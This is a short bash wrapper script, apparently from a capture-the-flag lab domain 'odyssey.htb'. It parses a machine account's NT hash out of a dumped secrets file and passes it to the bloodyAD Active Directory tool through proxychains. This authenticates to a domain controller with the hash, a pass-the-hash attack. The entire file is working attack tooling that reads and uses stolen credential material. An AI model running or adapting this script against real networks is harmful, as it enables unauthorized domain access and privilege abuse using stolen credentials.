#!/usr/bin/env bash
set -euo pipefail

source "$(dirname -- "${BASH_SOURCE[0]}")/common.sh"

bloodyad_bin=$(command -v bloodyAD 2>/dev/null || true)
if [[ -z "$bloodyad_bin" && -x /root/.local/bin/bloodyAD ]]; then
  bloodyad_bin=/root/.local/bin/bloodyAD
fi
[[ -n "$bloodyad_bin" ]] || {
  printf 'bloodyAD not found; install it with pipx and add /root/.local/bin to PATH\n' >&2
  exit 1
}

nt_hash=${ODYSSEY_DB_NT_HASH:-}
secrets_file="$odyssey_root/responses/odyssey-db-secrets.txt"
if [[ -z "$nt_hash" && -f "$secrets_file" ]]; then
  nt_hash=$(sed -n 's/^ODYSSEY\\ODYSSEY-DB\$:aad3b435b51404eeaad3b435b51404ee:\([0-9a-fA-F]\{32\}\):::$/\1/p' "$secrets_file" | head -n 1)
fi
[[ "$nt_hash" =~ ^[0-9a-fA-F]{32}$ ]] || {
  printf 'machine NT hash not found\n' >&2
  exit 1
}

exec proxychains4 -q "$bloodyad_bin" -s \
  -d odyssey.htb -u 'ODYSSEY-DB$' \
  -p "aad3b435b51404eeaad3b435b51404ee:$nt_hash" \
  -H 172.16.0.10 "$@"
